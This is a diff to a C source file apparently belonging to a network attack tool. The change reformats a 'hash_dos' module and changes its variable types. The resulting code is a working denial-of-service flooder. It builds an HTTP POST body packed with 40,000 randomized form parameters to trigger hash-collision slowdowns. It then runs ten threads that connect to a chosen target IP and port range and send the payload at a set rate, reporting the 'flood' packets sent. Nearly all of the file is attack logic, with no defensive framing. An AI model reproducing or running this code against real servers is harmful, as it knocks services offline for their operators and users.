@@ -5,20 +5,20 @@
 #include "ddos/hash_dos.h"
 
 // session counting
-unsigned long g_hash_dos_num_total;
-unsigned long g_hash_dos_num_generated_in_sec;
-//from main()
-char g_hash_dos_dest_ip[16] = { 0, };
-char g_hash_dos_src_ip[16] = { 0, };
-unsigned int g_hash_dos_src_mask;
-unsigned int g_hash_dos_dest_mask;
-unsigned int g_hash_dos_dest_port_start;
-unsigned int g_hash_dos_dest_port_end;
-unsigned int g_hash_dos_request_per_sec;
-//for masking next ip address
-char g_hash_dos_now_src_ip[16] = { 0, };
-char g_hash_dos_now_dest_ip[16] = { 0, };
-unsigned int g_hash_dos_now_dest_port;
+__u64 g_hash_dos_num_total;
+__u64 g_hash_dos_num_generated_in_sec;
+// from main()
+unsigned char g_hash_dos_dest_ip[16] = { 0, };
+unsigned char g_hash_dos_src_ip[16] = { 0, };
+__u32 g_hash_dos_src_mask;
+__u32 g_hash_dos_dest_mask;
+__u32 g_hash_dos_dest_port_start;
+__u32 g_hash_dos_dest_port_end;
+__u32 g_hash_dos_request_per_sec;
+// for masking next ip address
+unsigned char g_hash_dos_now_src_ip[16] = { 0, };
+unsigned char g_hash_dos_now_dest_ip[16] = { 0, };
+__u32 g_hash_dos_now_dest_port;
 // thread
 pthread_mutex_t g_hash_dos_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_hash_dos_cond;
@@ -31,8 +31,9 @@ char hash_dos_method[800300];
 
 void hash_dos_print_usage(void)
 {
-	printf("HASH DOS Attack Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
-	return ;
+	printf("HASH DOS Attack Usage : "
+				 "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
+	return;
 }
 
 void *generate_hash_dos(void *data)
@@ -41,8 +42,9 @@ void *generate_hash_dos(void *data)
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_hash_dos_mutex);
-		//get current resource
-		generator(g_hash_dos_src_ip,
+		// get current resource
+		generator(
+				g_hash_dos_src_ip,
 				g_hash_dos_dest_ip,
 				g_hash_dos_src_mask,
 				g_hash_dos_dest_mask,
@@ -51,14 +53,17 @@ void *generate_hash_dos(void *data)
 				g_hash_dos_now_src_ip,
 				g_hash_dos_now_dest_ip,
 				&g_hash_dos_now_dest_port);
-		//wait a second
+		// wait a second
 		if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
 			pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
 		}
-		//time check
-		time_check(&g_hash_dos_mutex, &g_hash_dos_cond, &g_hash_dos_before_time,
-				&g_hash_dos_now_time, &g_hash_dos_num_generated_in_sec);
-		//make socket;
+		// time check
+		time_check(
+				&g_hash_dos_cond,
+				&g_hash_dos_before_time,
+				&g_hash_dos_now_time,
+				&g_hash_dos_num_generated_in_sec);
+		// make socket
 		int sock;
 		if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
 			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
@@ -68,7 +73,7 @@ void *generate_hash_dos(void *data)
 		addr.sin_family = AF_INET;
 		addr.sin_port = htons(g_hash_dos_now_dest_port);
 		addr.sin_addr.s_addr = inet_addr(g_hash_dos_dest_ip);
-		//tcp connection
+		// tcp connection
 		if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
 			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
 			exit(1);
@@ -78,7 +83,7 @@ void *generate_hash_dos(void *data)
 			exit(1);
 		}
 		close(sock);
-		printf("%ld\n",g_hash_dos_num_generated_in_sec);
+		printf("%ld\n", g_hash_dos_num_generated_in_sec);
 		g_hash_dos_num_generated_in_sec++;
 		g_hash_dos_num_total++;
 		pthread_mutex_unlock(&g_hash_dos_mutex);
@@ -90,7 +95,11 @@ void *hash_dos_time_check(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_hash_dos_mutex);
-		time_check(&g_hash_dos_mutex, &g_hash_dos_cond, &g_hash_dos_before_time, &g_hash_dos_now_time, &g_hash_dos_num_generated_in_sec);
+		time_check(
+				&g_hash_dos_cond,
+				&g_hash_dos_before_time,
+				&g_hash_dos_now_time,
+				&g_hash_dos_num_generated_in_sec);
 		pthread_mutex_lock(&g_hash_dos_mutex);
 	}
 	return NULL;
@@ -98,7 +107,7 @@ void *hash_dos_time_check(void *data)
 
 void hash_dos_main(char *argv[])
 {
-	//argument check
+	// argument check
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
@@ -107,7 +116,8 @@ void hash_dos_main(char *argv[])
 		hash_dos_print_usage();
 		return;
 	}
-	split_ip_mask_port(argv,
+	split_ip_mask_port(
+			argv,
 			g_hash_dos_src_ip,
 			g_hash_dos_dest_ip,
 			&g_hash_dos_src_mask,
@@ -116,7 +126,7 @@ void hash_dos_main(char *argv[])
 			&g_hash_dos_dest_port_end);
 	g_hash_dos_num_generated_in_sec = 0;
 	g_hash_dos_num_total = 0;
-	//prepare arbitary post method args
+	// prepare arbitary post method args
 	srand(time(NULL));
 	char arg[21] = "arrrarrarrarrAaAa=1&";
 	for (int i = 0; i < 40000; i++) {
@@ -126,7 +136,16 @@ void hash_dos_main(char *argv[])
 		arg[16] = rand() % 26 + 'a';
 		strcat(hash_dos_content, arg);
 	}
-	sprintf(hash_dos_method, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.22.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n", g_hash_dos_src_ip, (int) sizeof(hash_dos_content));
+	sprintf(hash_dos_method,
+		"POST / HTTP/1.1\r\nHost: %s\r\n"
+		"User-Agent: python-requests/2.22.0\r\n"
+		"Accept-Encoding: gzip, deflate\r\n"
+		"Accept: */*\r\n"
+		"Connection: keep-alive\r\n"
+		"Content-Type: application/x-www-form-urlencoded\r\n"
+		"Content-Length: %d\r\n\r\n",
+		g_hash_dos_src_ip,
+		(int) sizeof(hash_dos_content));
 	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n", hash_dos_content);
 	memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
 	memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));
@@ -134,10 +153,15 @@ void hash_dos_main(char *argv[])
 	const int num_threads = 10;
 	pthread_t threads[9999];
 	int thread_ids[9999];
-	printf("Sending hash_dos requests to %s per %d\n", g_hash_dos_dest_ip, g_hash_dos_request_per_sec);
+	printf("Sending hash_dos requests to %s per %d\n",
+			g_hash_dos_dest_ip, g_hash_dos_request_per_sec);
 	int i;
 	for (i = 0; i < num_threads; i++) {
-		pthread_create(&threads[i], NULL, generate_hash_dos, (void *)&thread_ids[i]);
+		pthread_create(
+				&threads[i],
+				NULL,
+				generate_hash_dos,
+				(void *)&thread_ids[i]);
 	}
 	pthread_create(&threads[i], NULL, hash_dos_time_check, NULL);
 	for (int i = 0; i < num_threads; i++) {
@@ -146,7 +170,8 @@ void hash_dos_main(char *argv[])
 		printf("thread %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_hash_dos_mutex);
-	printf("hash_dos flood Finished\nTotal %ld packets sent.\n",g_hash_dos_num_total);
+	printf("hash_dos flood Finished\nTotal %ld packets sent.\n",
+			g_hash_dos_num_total);
 	pthread_exit(NULL);
 	return;
 }
